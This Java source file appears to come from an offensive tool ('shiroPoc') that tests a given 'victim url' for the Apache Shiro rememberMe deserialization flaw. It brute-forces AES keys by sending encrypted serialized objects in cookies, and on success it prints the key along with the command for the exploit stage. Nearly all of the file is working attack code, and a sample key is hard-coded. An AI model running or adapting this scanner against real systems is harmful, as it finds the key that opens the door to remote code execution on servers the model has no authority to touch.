package org.unicodesec;


import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.apache.http.Header;
import org.apache.http.HttpHeaders;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.shiro.subject.SimplePrincipalCollection;
import yso.payloads.Strings;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.LinkedList;
import java.util.List;

public class poc {
    public static void main(String[] args) throws Exception {
        String text = "   _____   _       _                  ______          _               _______                   _       \n" +
                "  / ____| | |     (_)                |  ____|        | |             |__   __|                 | |      \n" +
                " | (___   | |__    _   _ __    ___   | |__      ___  | |__     ___      | |      ___     ___   | |  ___ \n" +
                "  \\___ \\  | '_ \\  | | | '__|  / _ \\  |  __|    / __| | '_ \\   / _ \\     | |     / _ \\   / _ \\  | | / __|\n" +
                "  ____) | | | | | | | | |    | (_) | | |____  | (__  | | | | | (_) |    | |    | (_) | | (_) | | | \\__ \\\n" +
                " |_____/  |_| |_| |_| |_|     \\___/  |______|  \\___| |_| |_|  \\___/     |_|     \\___/   \\___/  |_| |___/\n" +
                "                                                                                                        \n" +
                "                                                                  Powered by UnicodeSec                 \n" +
                "                                                                  Version  0.0.3                        ";
        System.out.println(text);
        if (args.length == 0) {
            System.out.println("java -cp shiroPoc-[version]-all.jar org.unicodesec.poc [victim url]");
            System.out.println("java -cp shiroPoc-[version]-all.jar org.unicodesec.poc [victim url] shiroKey");
            System.out.println("eg:");
            System.out.println("\tjava -cp shiroPoc-[version]-all.jar org.unicodesec.poc http://127.0.0.1:8080/shiro\n");
            System.out.println("如果你想使用自定义shiro key检测，请使用如下命令");
            System.out.println("\tjava -cp shiroPoc-[version]-all.jar org.unicodesec.poc http://127.0.0.1:8080/shiro kPH+bIxk5D2deZiIxcaaaA==\n");
            System.err.println("  Available shiro key:");

            final List<String[]> rows = new LinkedList<String[]>();
            rows.add(new String[]{"index", "key"});
            rows.add(new String[]{"---------------", "---------------"});
            for (int i = 0; i < keys.keys.length; i++) {
                rows.add(new String[]{
                        String.valueOf(i),
                        keys.keys[i],
                });
            }

            final List<String> lines = Strings.formatTable(rows);
            for (String line : lines) {
                System.err.println("     " + line);
            }
            return;
        }

        String victimUrl = args[0];
        String key = "";
        if (args.length == 2){
            key = args[1];
            if (Base64.decode(key).length != 16){
                System.out.println("密钥长度错误，aes加密中，密钥长度为16位");
            }
        }
        CloseableHttpClient httpclient = HttpClients.createDefault();
        if (key.length() >0){
            if (detectShiroVuln(victimUrl, httpclient, key)) return;
        }
        else{
            for (int i = 0; i < keys.keys.length; i++) {
                if (detectShiroVuln(victimUrl, httpclient, keys.keys[i])) return;
            }
        }

        System.out.println(String.format("not found Shiro Vulnerability,"));


    }

    private static boolean detectShiroVuln(String victimUrl, CloseableHttpClient httpclient, String key) throws Exception {
        byte[] bytes = MakeGadget();
        String rememberMe = EncryptUtil.shiroEncrypt(key, bytes);
        HttpGet request = new HttpGet(victimUrl);
        request.setHeader(HttpHeaders.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36");
        request.setHeader("Cookie", "rememberMe=" + rememberMe);
        CloseableHttpResponse response = httpclient.execute(request);
        if (response.getStatusLine().getStatusCode() == 200) {
            boolean isDeleteMe = false;
            for (Header h : response.getAllHeaders()) {
                if (h.getName().toLowerCase().contains("set-cookie")) {
                    if (h.getValue().contains("rememberMe=deleteMe")) {
                        isDeleteMe = true;
                    }
                }
            }
            if (isDeleteMe == false) {
                System.out.println(String.format("found Shiro Vulnerability, Shiro key %s", key));
                System.out.println("use this command to exploit shiro:");
                System.out.println(String.format("\tjava -jar shiroPoc-[version]-all.jar %s [payload] [exploit type]", key));
                return true;
            }
        }


        response.close();
        return false;
    }

    private static byte[] MakeGadget() throws Exception {
        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
        return getBytes(simplePrincipalCollection);
    }

    private static byte[] getBytes(Object obj) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream;
        ObjectOutputStream objectOutputStream;
        byteArrayOutputStream = new ByteArrayOutputStream();
        objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        return byteArrayOutputStream.toByteArray();
    }

}

